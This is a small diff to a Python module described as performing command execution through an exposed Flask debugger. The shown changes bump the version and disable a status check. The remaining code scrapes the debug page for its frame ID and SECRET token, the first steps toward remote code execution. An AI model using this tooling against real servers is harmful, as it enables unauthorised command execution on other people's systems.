@@ -1,7 +1,7 @@
 '''
 name : Flask Debugger Command execution
 description : This module performs a command execution via flask debug bar.
-version : 1.0
+version : 1.1
 author : Ayato
 '''
 
@@ -20,9 +20,9 @@ def get_secret_and_frame(url, user_agent):
             url = url,
             headers=headers
         )
-        if res.status_code != 200:
-            print(f"[-] Could not access {url}")
-            return False, False, False
+        # if res.status_code != 200:
+        #    print(f"[-] Could not access {url}")
+        #    return False, False, False
         soup = bs4.BeautifulSoup(res.text, 'html.parser')
         frame_id = soup.find('div', {'class': 'frame'})['id'].replace('frame-', '')
         secret = re.search(r'SECRET\s*=\s*"([^"]+)"', res.text)[1]
